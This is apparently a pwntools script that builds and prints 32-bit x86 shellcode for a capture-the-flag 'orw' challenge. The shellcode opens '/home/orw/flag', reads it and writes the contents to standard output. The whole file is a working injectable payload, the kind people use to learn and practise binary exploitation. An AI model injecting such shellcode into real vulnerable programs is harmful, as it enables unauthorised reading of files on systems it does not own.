from pwn import *

shellcode = asm('\n'.join([
'push 0x1010101',
'xor dword ptr [esp], 0x1016660',
'push 0x6c662f77',
'push 0x726f2f65',
'push 0x6d6f682f',
'mov ebx, esp',
'xor ecx, ecx',
'xor edx, edx',
'push 0x5',
'pop eax',
'int 0x80',
'mov ebx, eax',
'push 0x3',
'pop eax',
'mov ecx, esp',
'push 0x64',
'pop edx',
'int 0x80',
'push 0x4',
'pop eax',
'push 0x1',
'pop ebx',
'push 0x64',
'pop edx',
'int 0x80',
]))


print(shellcode)
